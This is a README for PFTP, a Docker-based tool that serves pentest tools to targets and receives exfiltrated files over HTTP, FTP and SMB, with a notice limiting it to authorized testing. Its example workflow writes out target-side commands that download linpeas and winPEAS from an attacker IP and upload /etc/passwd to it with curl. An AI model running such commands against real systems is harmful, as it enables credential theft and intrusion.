# PFTP - Pentest File Transfer Protocols

A lightweight, multi-protocol file transfer hub for penetration testers, ethical hackers, and CTF players. Serves tools and receives exfiltrated data over HTTP, FTP, and SMB simultaneously.

[![PyPI](https://img.shields.io/pypi/v/pftp)](https://pypi.org/project/pftp/)
[![Docker](https://img.shields.io/docker/v/ahmadalawneh3/pftp?label=docker)](https://hub.docker.com/r/ahmadalawneh3/pftp)
[![License](https://img.shields.io/github/license/Ahmad-Alawneh99/pftp)](LICENSE)

## Features

- **Multi-Protocol**: HTTP, FTP, and SMB servers running simultaneously
- **Web UI**: Browse tools, upload files, copy download commands with one click
- **Command Generation**: PowerShell, wget, curl, bitsadmin, and base64-encoded commands
- **Network Detection**: Auto-detects interfaces, prioritizes VPN/tun0
- **File Upload**: Receive exfiltrated files via web UI or command line
- **Live Activity Logs**: Real-time monitoring of downloads and uploads via SSE
- **Authentication**: Optional basic auth across all protocols
- **CLI Management**: Simple commands to install, configure, and manage everything
- **Docker-Based**: Consistent environment, one-command deployment

## Installation

### Prerequisites

- Python 3.8+
- Docker

### Install

```bash
pip install pftp
```

Or with pipx:

```bash
pipx install pftp
```

## Quick Start

```bash
# Install and configure (interactive wizard)
pftp install

# Add your pentest tools
pftp add-tool /path/to/linpeas.sh --category linux
pftp add-tool /path/to/winPEAS.exe --category windows

# Start the server
pftp start

# Access the web UI at http://<your-ip>:1234
```

## Usage

### CLI Commands

```bash
pftp install              # Interactive setup wizard
pftp configure            # Reconfigure settings (interactive)
pftp start                # Start the server
pftp stop                 # Stop the server
pftp restart              # Restart the server
pftp status               # Show server status and configuration
pftp logs                 # View server logs (follow mode)
pftp update               # Update Docker image
pftp update --restart     # Update and restart
pftp remove               # Uninstall (keeps data by default)
pftp add-tool FILE        # Add file to tools directory
pftp add-tool DIR -r      # Add directory recursively
pftp add-tool FILE --category linux   # Add to subdirectory
pftp version              # Show version
```

### Non-Interactive Mode

All options can be passed as flags for scripting:

```bash
pftp install --yes --http-port 8080 --enable-ftp --disable-smb
pftp configure --auth --auth-username admin --auth-password secret
pftp configure --restart-policy always
```

### Web Interface

Once running, access the web UI at `http://<your-ip>:1234`:

- **Tools Tab**: Browse tools in a hierarchical directory view, search, and copy platform-specific download commands
- **Upload Tab**: Receive files via drag-and-drop or browse upload, with source IP tracking
- **Activity Log**: Live feed of all downloads and uploads

---

### Example Workflow

**On your attack machine:**

```bash
pftp install
pftp add-tool ~/tools/linpeas.sh --category linux
pftp add-tool ~/tools/winPEAS.exe --category windows
pftp start
```

**On target (Linux):**

```bash
wget http://10.10.14.5:1234/tools/linux/linpeas.sh -O linpeas.sh
```

**On target (Windows PowerShell):**

```powershell
Invoke-WebRequest -Uri "http://10.10.14.5:1234/tools/windows/winPEAS.exe" -OutFile "winPEAS.exe"
```

**Upload from target:**

```bash
curl -F "file=@/etc/passwd" http://10.10.14.5:1234/upload
```

**FTP access:**

```bash
ftp 10.10.14.5
```

**SMB access (Windows):**

```cmd
net use \\10.10.14.5\tools
copy \\10.10.14.5\tools\windows\winPEAS.exe .
```

## Configuration

Configuration is stored in `~/.pftp/config/config.yaml` and managed via the CLI.

### Protocols

| Protocol | Default Port | Purpose |
| -------- | ------------ | ------- |
| HTTP | 1234 | Web UI, file download/upload, command generation |
| FTP | 21 | Anonymous FTP access to tools, upload to uploads |
| SMB | 445 | Windows-native file sharing |

All protocols can be individually enabled/disabled:

```bash
pftp configure --enable-ftp --disable-smb
```

### Authentication

Optional authentication protects the web UI and download endpoints. The upload endpoint (`/upload`) remains open so targets can upload files without credentials.

```bash
pftp configure --auth --auth-username admin --auth-password mysecret
```

When auth is enabled, the web UI displays credentials in generated download commands automatically.

### Docker Restart Policy

```bash
pftp configure --restart-policy always
```

Options: `no`, `always`, `unless-stopped` (default), `on-failure`

## Directory Structure

```
~/.pftp/
├── config/
│   └── config.yaml       # Configuration
├── tools/                 # Your pentest tools
│   ├── linux/
│   ├── windows/
│   └── exploits/
└── uploads/               # Received files from targets
```

## Docker Image

The server runs inside a Docker container using host networking for full interface access.

- **Image**: [ahmadalawneh3/pftp](https://hub.docker.com/r/ahmadalawneh3/pftp)
- **Base**: python:3.11-slim
- **Runs as**: non-root user (appuser, UID 5678)

Manual Docker usage (without the CLI):

```bash
docker run --network host \
  -v ~/.pftp/tools:/app/data/tools \
  -v ~/.pftp/uploads:/app/data/uploads \
  ahmadalawneh3/pftp:latest
```

## Troubleshooting

### Docker Daemon Not Running

```
Error: Cannot connect to Docker daemon. Is Docker running?
```

Start Docker Desktop or the Docker daemon.

### Port Already in Use

```bash
pftp configure --http-port 8080
pftp restart
```

### Permission Issues (Linux)

```bash
sudo usermod -aG docker $USER
newgrp docker
```

## Security Notice

- **Authorized use only** - designed for penetration testing, CTF, and lab environments
- **Not for production** - this is a testing tool
- **HTTP only** - traffic is unencrypted, use on VPN or isolated networks
- **Upload endpoint is open** - intentionally unauthenticated so targets can upload

## Contributing

Contributions are welcome. Fork the repo, create a feature branch, and submit a pull request.

## License

MIT License - see [LICENSE](LICENSE) for details.

## Author

Ahmad Alawneh
